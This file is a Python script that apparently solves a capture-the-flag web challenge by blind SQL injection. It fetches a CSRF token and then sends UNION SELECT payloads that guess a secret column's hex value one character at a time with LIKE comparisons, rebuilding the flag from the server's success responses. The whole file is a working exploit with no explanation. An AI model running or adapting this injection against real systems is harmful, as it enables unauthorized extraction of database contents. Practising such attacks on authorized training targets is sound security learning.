import requests
import string

BASE_URL = "http://web-17.challs.olicyber.it/api/"


class Inj:
    def __init__(self):
        self.sess = requests.Session()
        print(self.sess)
        self.token = self.get_token()
        print(self.token)

    def get_token(self):
        url = f"{BASE_URL}get_token"
        self.req = self.sess.get(url)
        self.json = self.req.json()
        return self.json["token"]

    def request(self, query):
        header = {"X-CSRFToken": self.token}
        payload = {"query": query}
        url = f"{BASE_URL}blind"
        res = self.sess.post(url, json=payload, headers=header)
        res = res.json()
        return res["sql_error"], res["result"]


if __name__ == "__main__":
    inj = Inj()
    alphabet = "0123456789ABCDEF"
    flag = ""
    end = False
    while not end:
        for c in alphabet:
            f = flag + c
            q = f"1' and false union select asecret,2 from secret where hex(asecret) like '{f}%' and '1'='1"
            error, result = inj.request(q)
            if result == "Success":
                flag = flag + c
                print(flag)
                break
        else:
            end = True
            break

    flag = bytes.fromhex(flag).decode()
    print("flag:", flag)
